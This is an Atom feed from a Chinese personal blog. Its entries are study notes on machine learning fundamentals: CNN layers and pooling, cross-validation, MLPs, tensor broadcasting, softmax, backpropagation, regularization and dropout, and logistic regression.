<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>网络安全</title>
  
  <subtitle>学习笔记</subtitle>
  <link href="https://myprefer.github.io/atom.xml" rel="self"/>
  
  <link href="https://myprefer.github.io/"/>
  <updated>2024-08-14T10:30:31.251Z</updated>
  <id>https://myprefer.github.io/</id>
  
  <author>
    <name>Myperfer</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ML 卷积神经网络</title>
    <link href="https://myprefer.github.io/post/ML-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html"/>
    <id>https://myprefer.github.io/post/ML-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html</id>
    <published>2024-08-13T15:50:25.000Z</published>
    <updated>2024-08-14T10:30:31.251Z</updated>
    
    <content type="html"><![CDATA[<h2 id="卷积神经网络"><a href="#卷积神经网络" class="headerlink" title="卷积神经网络"></a>卷积神经网络</h2><h3 id="卷积层"><a href="#卷积层" class="headerlink" title="卷积层"></a>卷积层</h3><p> 在卷积层中, 使用卷积核在输入图像上滑动, 并计算卷积核与局部图像块之间的点积, 生成特征图, 这一过程称为<strong>卷积</strong>。</p><p>如图, 3x3的卷积核在4x4的图像上滑动, 生成2x2的特征图</p><p><img src="https://raw.githubusercontent.com/vdumoulin/conv_arithmetic/master/gif/no_padding_no_strides.gif"></p><p>通过这种方式，卷积层能够捕捉图像中的边缘、纹理等局部特征。</p><ul><li>例如，一个简单的卷积核, 用于检测水平边缘:</li></ul><p>$$<br>K &#x3D; \begin{pmatrix} -1 &amp; -1 &amp; -1 \ 0 &amp; 0 &amp; 0 \ 1 &amp; 1 &amp; 1 \end{pmatrix}<br>$$</p><ul><li>图像上某一局部区域的像素值在卷积操作中，如果存在水平方向上的亮度变化（例如，从黑色像素到白色像素），卷积的结果就会是一个较大的值，表示该区域存在水平边缘</li></ul><p>卷积核和偏移(b)是可学习的参数</p><p>卷积核的大小是超参数</p><h4 id="填充和步幅"><a href="#填充和步幅" class="headerlink" title="填充和步幅"></a>填充和步幅</h4><p>(Padding, strides)<br><img src="https://raw.githubusercontent.com/vdumoulin/conv_arithmetic/master/gif/padding_strides.gif" alt="img"></p><ul><li>填充和步幅是卷积层的超参数</li><li>填充正在输入周围添加额外的行&#x2F;列, 来控制输出的减少量</li><li>步幅是每次滑动卷积核的步长, 可以成倍的减少输出的形状</li></ul><h4 id="通道"><a href="#通道" class="headerlink" title="通道"></a>通道</h4><p>神经网络中另外一个重要的超参数是<strong>通道数</strong></p><p><strong>多个输入通道</strong></p><ul><li><p>彩色图片一般有RGB三个通道<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408141329213.png"></p></li><li><p>每个通道都有一个卷积核, 结果是所有通道卷积结果的和<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408141330539.png"></p></li></ul><p><strong>多个输出通道</strong></p><ul><li><p>为什么要有多个输出通道？因为不管有多少个输入通道只会得到单输出通道的话是不够的</p></li><li><p>如果对每一个输出通道有一个三维的卷积核，这个卷积核会输出自己的通道（就相当于在三维的基础上又加了一维 i ，这一维表示输出的通道数）</p></li><li><p>可以有多个三维卷积核, 每个核生成一个输出通道</p></li><li><p>每个输出通道可以识别特定模式</p></li><li><p>输入通道核识别并组合输入中的模式</p></li></ul><h4 id="1x1卷积层"><a href="#1x1卷积层" class="headerlink" title="1x1卷积层"></a>1x1卷积层</h4><ul><li><p>卷积核的高和宽都等于1，意味着它不会识别空间信息，因为他每次只看一个空间像素所以不会去识别通道中的空间信息</p></li><li><p>1x1卷积不识别空间模式, 只是融合不同通道的信息</p></li><li><p>相当于输入形状为n_h*n_w*c, 权重为c_o*c_i的全连接层<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408141427758.png"></p></li></ul><p><strong>作用</strong></p><ul><li><p>融合不同通道的信息, 可以认为是不做空间的匹配, 只是在输入层直接做输入通道和输出通道的融合, 等价于将整个输入拉成一个向量, 通道数等于特征的数量, 卷积核就相当于一个全连接层</p></li><li><p>1x1卷积可以在不改变输入特征图空间分辨率的情况下, 改变其通道数, 卷积层的输出的通道数由卷积核的个数决定, 通过设置1x1卷积核的数量, 可以做到升维&#x2F;降维</p></li></ul><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="池化层"><a href="#池化层" class="headerlink" title="池化层"></a>池化层</h3><h4 id="二维最大池化"><a href="#二维最大池化" class="headerlink" title="二维最大池化"></a>二维最大池化</h4><ul><li>返回滑动窗口的<strong>最大值</strong><br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408141504312.png"></li></ul><p>例如2x2最大池化将卷积输出增加左右各一个像素, 这样就允许了1个像素的移位, 缓解了卷积层对位置的敏感性</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240814150602.png"></p><h4 id="平均池化层"><a href="#平均池化层" class="headerlink" title="平均池化层"></a>平均池化层</h4><ul><li>返回滑动窗口的<strong>平均值</strong></li></ul><hr><p><strong>总结</strong>:</p><ul><li>池化层返回窗口的最大或平均值</li><li>缓解卷积层对位置的敏感性</li><li>同样有窗口大小, 填充, 步幅作为超参数</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;卷积神经网络&quot;&gt;&lt;a href=&quot;#卷积神经网络&quot; class=&quot;headerlink&quot; title=&quot;卷积神经网络&quot;&gt;&lt;/a&gt;卷积神经网络&lt;/h2&gt;&lt;h3 id=&quot;卷积层&quot;&gt;&lt;a href=&quot;#卷积层&quot; class=&quot;headerlink&quot; title=&quot;卷积层</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 模型选择</title>
    <link href="https://myprefer.github.io/post/ML-%E6%A8%A1%E5%9E%8B%E9%80%89%E6%8B%A9.html"/>
    <id>https://myprefer.github.io/post/ML-%E6%A8%A1%E5%9E%8B%E9%80%89%E6%8B%A9.html</id>
    <published>2024-08-11T14:33:31.000Z</published>
    <updated>2024-08-12T02:39:20.761Z</updated>
    
    <content type="html"><![CDATA[<h3 id="训练误差和泛化误差"><a href="#训练误差和泛化误差" class="headerlink" title="训练误差和泛化误差"></a>训练误差和泛化误差</h3><ul><li>训练误差: 模型在训练数据上的误差</li><li>泛化误差: 模型在新数据上的误差</li></ul><h3 id="验证数据集和测试数据集"><a href="#验证数据集和测试数据集" class="headerlink" title="验证数据集和测试数据集"></a>验证数据集和测试数据集</h3><ul><li>验证数据集: 原来评估模型好坏<ul><li>验证数据集用于模型训练过程中进行验证和调参。通过在验证集上评估模型性能，可以监控模型是否过拟合，并且通过验证集来选择最优的超参数（如学习率、正则化强度等）</li><li>通常占数据集的10%-15%。验证集的数据不参与训练，主要用于在训练期间监控模型性能。</li></ul></li><li>测试数据集<ul><li>测试数据集用于在模型训练完毕后评估其泛化能力。这部分数据从未在模型训练或验证过程中使用过，因此可以较为客观地评估模型在真实世界中的表现。</li></ul></li></ul><h3 id="K折交叉验证"><a href="#K折交叉验证" class="headerlink" title="K折交叉验证"></a>K折交叉验证</h3><ul><li>在没有足够多数据时使用</li><li>算法:<ul><li>将心力衰竭分为k块</li><li>For i &#x3D; 1, …, k<ul><li>使用第i块作为验证数据集, 其余为训练数据集</li></ul></li><li>报告k个验证集误差的平均</li></ul></li></ul><h3 id="模型容量"><a href="#模型容量" class="headerlink" title="模型容量"></a>模型容量</h3><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408121026292.png"></p><ul><li>指拟合各种函数的能力 </li><li>低容量的模型难以拟合训练数据</li><li>高容量的模型可以记住所有的训练数据</li></ul><p><strong>模型容量的影响</strong></p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408121029668.png"></p><h3 id="数据复杂度"><a href="#数据复杂度" class="headerlink" title="数据复杂度"></a>数据复杂度</h3><ul><li><p>样本个数</p></li><li><p>每个样本的元素个数</p></li><li><p>时间, 空间结构</p></li><li><p>多样性</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;训练误差和泛化误差&quot;&gt;&lt;a href=&quot;#训练误差和泛化误差&quot; class=&quot;headerlink&quot; title=&quot;训练误差和泛化误差&quot;&gt;&lt;/a&gt;训练误差和泛化误差&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;训练误差: 模型在训练数据上的误差&lt;/li&gt;
&lt;li&gt;泛化误差: 模型在</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 多层感知机</title>
    <link href="https://myprefer.github.io/post/ML-%E5%A4%9A%E5%B1%82%E6%84%9F%E7%9F%A5%E6%9C%BA.html"/>
    <id>https://myprefer.github.io/post/ML-%E5%A4%9A%E5%B1%82%E6%84%9F%E7%9F%A5%E6%9C%BA.html</id>
    <published>2024-08-11T08:53:57.000Z</published>
    <updated>2024-08-11T11:31:10.989Z</updated>
    
    <content type="html"><![CDATA[<h2 id="多层感知机"><a href="#多层感知机" class="headerlink" title="多层感知机"></a>多层感知机</h2><p><em>最简单</em>的深度学习网络称为<em>多层感知机</em></p><h4 id="感知机-PLA"><a href="#感知机-PLA" class="headerlink" title="感知机(PLA)"></a>感知机(PLA)</h4><p>感知机只有输入层和输出层, 是单个神经元模型, 是一个线性二分类器, 但是不能对非线性的数据进行有效的分类, 感知机公式:</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408111710041.png"></p><p>感知机结构如下, 只有输入层, 输出层<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408111817373.png"></p><h4 id="多层感知机-MLP"><a href="#多层感知机-MLP" class="headerlink" title="多层感知机(MLP)"></a>多层感知机(MLP)</h4><p>多层感知机由感知机推广而来,  有多个层, 通常包括一个输入层, 一个或多个隐藏层, 一个输出层</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408111922514.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;多层感知机&quot;&gt;&lt;a href=&quot;#多层感知机&quot; class=&quot;headerlink&quot; title=&quot;多层感知机&quot;&gt;&lt;/a&gt;多层感知机&lt;/h2&gt;&lt;p&gt;&lt;em&gt;最简单&lt;/em&gt;的深度学习网络称为&lt;em&gt;多层感知机&lt;/em&gt;&lt;/p&gt;
&lt;h4 id=&quot;感知机-PLA&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 数据操作</title>
    <link href="https://myprefer.github.io/post/ML-%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C.html"/>
    <id>https://myprefer.github.io/post/ML-%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C.html</id>
    <published>2024-08-10T03:09:24.000Z</published>
    <updated>2024-08-10T03:36:36.433Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h2><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>例:</p><ul><li><p>零维 一个数字</p></li><li><p>一维 多个数字</p></li><li><p>二维 矩阵(长*宽)</p></li><li><p>三维 RGB图片(通道*长*宽)</p></li><li><p>四维 图片批量(通道*长*宽*批量)</p></li><li><p>五维 视频(通道*长*宽*批量*时间)</p></li></ul><p>使用shape属性访问张量的形状和元素总数</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">x = tensor([ 0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11])</span></span><span class="line"><span style="color: #babed8">x.shape = torch.Size([12])</span></span></code></pre></div><p>reshape函数可以改变张量的形状</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">X = x.reshape(3, 4)</span></span><span class="line"><span style="color: #babed8"></span></span><span class="line"><span style="color: #babed8">X = tensor([[ 0,  1,  2,  3],</span></span><span class="line"><span style="color: #babed8">        [ 4,  5,  6,  7],</span></span><span class="line"><span style="color: #babed8">        [ 8,  9, 10, 11]])</span></span></code></pre></div><h3 id="广播机制"><a href="#广播机制" class="headerlink" title="广播机制"></a>广播机制</h3><p>形状不同的数组可以调用广播机制执行按元素操作 </p><p>如</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">a = tensor([[0],</span></span><span class="line"><span style="color: #babed8">            [1],</span></span><span class="line"><span style="color: #babed8">            [2]])</span></span><span class="line"><span style="color: #babed8"> b = tensor([[0, 1]])</span></span></code></pre></div><p>如果执行<code>a + b</code></p><p>计算时, a, b会进行复制变换(实际没有改变)</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">a = tensor([[0, 0],</span></span><span class="line"><span style="color: #babed8">             [1, 1],</span></span><span class="line"><span style="color: #babed8">             [2, 2]])</span></span><span class="line"><span style="color: #babed8">b = tensor([[0, 1],</span></span><span class="line"><span style="color: #babed8">            [0, 1],</span></span><span class="line"><span style="color: #babed8">            [0, 1]])</span></span></code></pre></div><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">a + b = tensor([[0, 1],</span></span><span class="line"><span style="color: #babed8">                [1, 2],</span></span><span class="line"><span style="color: #babed8">                [2, 3]])</span></span></code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;数据操作&quot;&gt;&lt;a href=&quot;#数据操作&quot; class=&quot;headerlink&quot; title=&quot;数据操作&quot;&gt;&lt;/a&gt;数据操作&lt;/h2&gt;&lt;h3 id=&quot;数组&quot;&gt;&lt;a href=&quot;#数组&quot; class=&quot;headerlink&quot; title=&quot;数组&quot;&gt;&lt;/a&gt;数组&lt;/h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 多分类问题</title>
    <link href="https://myprefer.github.io/post/ML-%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98.html"/>
    <id>https://myprefer.github.io/post/ML-%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98.html</id>
    <published>2024-08-04T09:32:35.000Z</published>
    <updated>2024-08-11T06:51:29.777Z</updated>
    
    <content type="html"><![CDATA[<h2 id="多分类问题"><a href="#多分类问题" class="headerlink" title="多分类问题"></a>多分类问题</h2><h3 id="从回归到分类"><a href="#从回归到分类" class="headerlink" title="从回归到分类"></a>从回归到分类</h3><h5 id="回归"><a href="#回归" class="headerlink" title="回归"></a>回归</h5><ul><li>单连续数值输出</li><li>跟真实值的区别作为损失</li></ul><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><ul><li>通常多个输出</li><li>输出i时预测为第i类的置信度(概率)</li></ul><h3 id="softmax-回归算法"><a href="#softmax-回归算法" class="headerlink" title="softmax 回归算法"></a>softmax 回归算法</h3><p>Softmax回归，又称多类别逻辑回归，是一种广泛用于多分类问题的算法。它是逻辑回归的扩展，能够处理具有多个类别的分类任务。</p><p>Softmax 回归算法的模型可以表示为：</p><p> <img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408041739591.png"></p><p>在二分类问题中, 逻辑回归使用<em>sigmoid</em>函数将输入映射到一个概率值, 在多分类问题中, 我们使用softmax函数将输入映射到一组的概率值, 这些概率值的和为1</p><h4 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h4><p>Softmax回归使用交叉熵损失函数来衡量预测结果和真实标签之间的差距</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408041831604.png"></p><p>一般的表示为</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408041828347.png"></p><p>其中 x 是输入特征，y 是输出类别, yk表示真实标签的 one-hot 编码形式，K 是类别总数。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;多分类问题&quot;&gt;&lt;a href=&quot;#多分类问题&quot; class=&quot;headerlink&quot; title=&quot;多分类问题&quot;&gt;&lt;/a&gt;多分类问题&lt;/h2&gt;&lt;h3 id=&quot;从回归到分类&quot;&gt;&lt;a href=&quot;#从回归到分类&quot; class=&quot;headerlink&quot; title=&quot;从</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 神经网络</title>
    <link href="https://myprefer.github.io/post/ML-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html"/>
    <id>https://myprefer.github.io/post/ML-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html</id>
    <published>2024-08-03T08:43:22.000Z</published>
    <updated>2024-08-11T11:48:48.305Z</updated>
    
    <content type="html"><![CDATA[<h2 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h2><p>用于识别复杂模式和数据中的特征。是机器学习和深度学习中的基础工具，特别适用于处理图像、语音和文本等非结构化数据。</p><h3 id="层（Layer）"><a href="#层（Layer）" class="headerlink" title="层（Layer）"></a>层（Layer）</h3><p>神经元按层组织，每一层的神经元与上一层的神经元相连。通常，神经网络包括输入层、隐藏层和输出层。</p><ul><li><p><strong>输入层</strong>：接收外部数据作为输入。</p></li><li><p><strong>隐藏层</strong>：通过多个隐藏层进行复杂的特征提取和模式识别。</p></li><li><p><strong>输出层</strong>：输出最终的预测结果或分类结果。</p></li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031747355.png"></p><p>每一层的输出成为下一层的输入 </p><h3 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h3><p>在多层神经网络中, 上层节点的输出和下层节点的输入之间存在一个函数关系, 这个函数称为激活函数</p><h4 id="激活函数的作用"><a href="#激活函数的作用" class="headerlink" title="激活函数的作用"></a>激活函数的作用</h4><p>如果不使用激活函数(或者是只使用线性激活函数), 那么每一层节点的输入都是上层输出的线性变换, 这种情况下, 无论神经网络有多少层, 输出都只会是输入的线性组合, 网络的效果与没有隐藏层时的效果差不多, 网络的逼近能力就非常有限</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408041616976.png"></p><p>如果引入非线性函数作为激活函数, 那么网络的表达能力就会非常强大, 几乎可以逼近任何函数</p><h4 id="激活函数的选择"><a href="#激活函数的选择" class="headerlink" title="激活函数的选择"></a>激活函数的选择</h4><ul><li><p><strong>sigomoid</strong><br>$$<br>\sigma(x) &#x3D; \frac{1}{1 + e^{-x}}<br>$$<br><strong>适用场景</strong>：用于输出层处理<strong>二分类</strong>问题。</p></li><li><p><strong>ReLU</strong><br>$$<br>ReLU(x)&#x3D;max(0,x)<br>$$<br><strong>适用场景</strong>：</p><ul><li>广泛用于<strong>隐藏层</strong>，特别是在深度神经网络中。</li><li>用于<strong>回归问题</strong>的输出层</li></ul></li><li><p><strong>Softmax</strong><br>$$<br>\text{Softmax}(x_i) &#x3D; \frac{e^{x_i}}{\sum_{j} e^{x_j}}<br>$$<br><strong>适用场景</strong>：用于<strong>多分类</strong>问题的输出层。</p></li></ul><h3 id="前向传播"><a href="#前向传播" class="headerlink" title="前向传播"></a>前向传播</h3><p>神经网络前向传播从输入层到输出层：前向传播就是从输入层开始，经过一层层的Layer，不断计算每一层的神经网络得到的结果及通过激活函数的本层输出结果，最后得到输出的过程。</p><p><strong>输入层-&gt;隐藏层1</strong></p><p><strong>隐藏层1-&gt;隐藏层2</strong></p><p><strong>…</strong></p><p><strong>隐藏层n-&gt;输出层</strong></p><h3 id="反向传播"><a href="#反向传播" class="headerlink" title="反向传播"></a>反向传播</h3><ul><li>前向传播计算出了输出值（也即预测值），就可以根据输出值与目标值的差别来计算loss</li><li>反向传播使根据损失函数计算损失函数相对于每个参数的梯度，来调整网络的参数</li></ul><h4 id="反向传播的步骤"><a href="#反向传播的步骤" class="headerlink" title="反向传播的步骤"></a>反向传播的步骤</h4><ul><li>计算输出层的误差</li><li>反向传播误差<ul><li>对于每个隐藏层，计算误差</li><li>从输出层开始，一层层反向计算，直到输入层</li></ul></li><li>梯度计算</li><li>参数更新</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;神经网络&quot;&gt;&lt;a href=&quot;#神经网络&quot; class=&quot;headerlink&quot; title=&quot;神经网络&quot;&gt;&lt;/a&gt;神经网络&lt;/h2&gt;&lt;p&gt;用于识别复杂模式和数据中的特征。是机器学习和深度学习中的基础工具，特别适用于处理图像、语音和文本等非结构化数据。&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 正则化</title>
    <link href="https://myprefer.github.io/post/ML-%E6%AD%A3%E5%88%99%E5%8C%96.html"/>
    <id>https://myprefer.github.io/post/ML-%E6%AD%A3%E5%88%99%E5%8C%96.html</id>
    <published>2024-08-03T06:40:12.000Z</published>
    <updated>2024-08-13T12:58:48.962Z</updated>
    
    <content type="html"><![CDATA[<h2 id="正则化"><a href="#正则化" class="headerlink" title="正则化"></a>正则化</h2><p>在机器学习模型中，正则化通过在模型的损失函数中添加一个正则项来实现。这些惩罚项通常会限制模型的复杂度，使模型更加简单，从而更好地泛化到新数据。</p><p>在代价函数中加入正则项，通过lambda的来平衡拟合程度和参数的大小，约大越容易出现过拟合的现象。</p><p>引入正则项后的代价函数:</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031351589.png"></p><p><strong>λ</strong> 为正则化参数</p><ul><li>如果 λ 很大，正则化项的影响就很大，模型参数会被压得很小，导致模型变得简单（比如变成一条平滑的线）</li><li>如果 λ 很小，正则化项的影响就很小，模型参数可以自由调整，模型可能会变得复杂。</li></ul><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>如果有很多参数，我们<strong>不清楚哪个参数是高阶项</strong>，即<strong>不知道惩罚哪个能获得更好拟合的结果</strong>，因此<strong>引入正则化项统一惩罚参数</strong>(正则化参数)以得到较为简单的函数</p><p>统一惩罚能得到简单结果是因为，高阶项受到惩罚的效果会更强，反映在图像上就是使其影响变弱</p><ul><li>在线性回归中, 正则化使参数w每次都与一个小于1的数相乘, 使参数w在每次迭代中收缩一点</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031457844.png"></p><p>可以直观的理解为，我们<strong>最小化损失函数</strong>就是<strong>求蓝圈+红圈的和的最小值</strong>，而这个值通在很多情况下是两个曲面相交的地方。</p><h3 id="Dropout"><a href="#Dropout" class="headerlink" title="Dropout"></a>Dropout</h3><p>好的模型应该对输入数据的扰动更鲁棒, 使用丢弃法(dropout)在层之间加入噪音</p><p>丢弃法对每个元素进行如下扰动<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408132042456.png"></p><p>有p的概率置为0, 否则置为x&#x2F;(1-p)(保证期望仍为x), p为丢弃概率, 是控制模型复杂度的超参数</p><p>通常将丢弃法作用在隐藏全连接层的输出上</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408132055420.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;正则化&quot;&gt;&lt;a href=&quot;#正则化&quot; class=&quot;headerlink&quot; title=&quot;正则化&quot;&gt;&lt;/a&gt;正则化&lt;/h2&gt;&lt;p&gt;在机器学习模型中，正则化通过在模型的损失函数中添加一个正则项来实现。这些惩罚项通常会限制模型的复杂度，使模型更加简单，从而更好地泛化</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 逻辑回归</title>
    <link href="https://myprefer.github.io/post/ML-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92.html"/>
    <id>https://myprefer.github.io/post/ML-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92.html</id>
    <published>2024-08-02T13:24:59.000Z</published>
    <updated>2024-08-12T02:37:53.081Z</updated>
    
    <content type="html"><![CDATA[<h2 id="逻辑回归"><a href="#逻辑回归" class="headerlink" title="逻辑回归"></a>逻辑回归</h2><p>逻辑回归用来解决<strong>分类</strong>问题, 如样本标签值为0或1, 则线性回归输出的值不太符合实际, 有较大的误差</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408022202719.png"></p><p>对上述数据使用逻辑回归模型(这里使用了sigmoid函数), 可以得到更加精确的结果<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408022222661.png"></p><h3 id="决策边界"><a href="#决策边界" class="headerlink" title="决策边界"></a>决策边界</h3><p>在分类问题中, 把不同类别的数据点分开的界限</p><p>例如<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408022247517.png"></p><p>视情况而定, 决策边界可以是一条直线, 也可以是更加复杂的曲线</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408022249453.png"></p><h3 id="逻辑回归中的代价函数"><a href="#逻辑回归中的代价函数" class="headerlink" title="逻辑回归中的代价函数"></a>逻辑回归中的代价函数</h3><p>逻辑回归中, 代价函数不是凹函数, 在梯度下降中, 有多个局部最小值, 因此不能使用梯度下降的方法求解全局最小值</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408022310976.png"></p><h4 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h4><ul><li>损失函数(loss function)是在一个训练样本的表现</li><li>把所有训练样本的损失加起来得到的代价函数(cost function)才能衡量模型在整个训练集上的表现</li></ul><p> 逻辑回归中的损失函数<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031024723.png"></p><p>简化后损失函数</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031103882.png"></p><p>代价函数为</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031104772.png"></p><h3 id="逻辑回归中的梯度下降"><a href="#逻辑回归中的梯度下降" class="headerlink" title="逻辑回归中的梯度下降"></a>逻辑回归中的梯度下降</h3><p>梯度下降公式</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031123422.png"></p><p>推导得出逻辑回归的梯度下降公式与线性回归的几乎一模一样, 但是他们本质是不同的, 因为函数f是不同的</p><h3 id="过拟合"><a href="#过拟合" class="headerlink" title="过拟合"></a>过拟合</h3><ul><li><p>差拟合 : 无法很好的适应训练集, 会有较大的误差</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031145373.png"></p></li><li><p>泛化 : 指一个假设模型应用到新样本的能力, 我们追求泛化能力好的模型</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031145437.png"></p></li><li><p>过拟合 : 模型过于强调拟合原始数据, 这样导致丢失了预测新数据的算法本质。对于原始数据, 该模型表现的非常好, 但是对于一个新数据, 其表现很可能会很差<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031146526.png"></p></li></ul><h4 id="解决过拟合问题"><a href="#解决过拟合问题" class="headerlink" title="解决过拟合问题"></a>解决过拟合问题</h4><ul><li><p>获取更多训练数据</p></li><li><p>舍弃部分不能帮助我们正确预测的特征(可能导致有用的特征被丢弃)</p></li><li><p>正则化: 保留原有特征, 减小参数大小</p></li></ul><h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;逻辑回归&quot;&gt;&lt;a href=&quot;#逻辑回归&quot; class=&quot;headerlink&quot; title=&quot;逻辑回归&quot;&gt;&lt;/a&gt;逻辑回归&lt;/h2&gt;&lt;p&gt;逻辑回归用来解决&lt;strong&gt;分类&lt;/strong&gt;问题, 如样本标签值为0或1, 则线性回归输出的值不太符合实际, 有较</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 基本概念</title>
    <link href="https://myprefer.github.io/post/ML-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html"/>
    <id>https://myprefer.github.io/post/ML-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html</id>
    <published>2024-07-30T08:58:33.000Z</published>
    <updated>2024-08-12T14:05:55.713Z</updated>
    
    <content type="html"><![CDATA[<h2 id="监督学习"><a href="#监督学习" class="headerlink" title="监督学习"></a>监督学习</h2><p>监督学习是已经知道数据的label</p><p>即</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">Learns from being given &#39;right answers&#39;.</span></span></code></pre></div><p>从正确答案中学习</p><ul><li>例如预测房价问题，给出了房子的面积和价格</li><li>例如过滤垃圾邮件, 训练时给出了邮件和它是否是垃圾</li><li>例如图像目标检测</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407301705403.png"></p><p><strong>回归问题</strong>是预测连续值的输出，例如预测房价</p><ul><li>从无限多可能的输出数字中预测数字</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407301706669.png"></p><p><strong>分类问题</strong>是预测离散值输出，例如判断肿瘤是良性还是恶性, 判断是猫还是狗</p><ul><li>从一小部分的可能的输出中预测类别</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407301718739.png"></p><ul><li><p>输入通常有多个</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407301721495.png"></p></li></ul><h2 id="无监督学习"><a href="#无监督学习" class="headerlink" 